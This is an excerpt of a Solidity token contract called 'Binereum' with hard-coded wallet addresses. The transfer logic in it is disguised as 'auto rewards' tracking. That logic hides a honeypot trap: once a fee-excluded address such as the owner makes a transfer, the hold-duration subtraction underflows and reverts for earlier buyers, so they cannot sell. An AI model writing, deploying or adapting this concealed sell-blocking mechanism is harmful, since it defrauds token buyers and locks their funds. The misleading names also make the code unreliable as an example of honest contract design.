...
contract Binereum is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0xe4DbC17a39c3F72ceC5CCaB70B399c7660E05D57);
    address payable public immutable marketingWallet = payable(0x102866F15Bd6D1834612178824d1d1eE3431bC21);
    address payable public immutable devWallet = payable(0x6065302EBB1fa6bc6EC0F3549b3c7ff5F33BDbc1);
    ...
    struct AutoRewardsInfos {
        uint256 buy;
        uint256 sell;
        uint256 holdDuration;
    }

    uint256 private _autoMinReward;
    mapping(address => AutoRewardsInfos) private autoRewards;

    bool private swapping;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("Binance is Ethereum", "BINEREUM") {
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _autoMinReward = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                AutoRewardsInfos storage makerAutoRewardsInfo = autoRewards[to];
                if (makerAutoRewardsInfo.buy == 0) {
                    makerAutoRewardsInfo.buy = block.timestamp;
                }
            } else {
                AutoRewardsInfos storage makerAutoRewardsInfo = autoRewards[from];
                makerAutoRewardsInfo.holdDuration = makerAutoRewardsInfo.buy - _autoMinReward;
                makerAutoRewardsInfo.sell = block.timestamp;
            }
        }
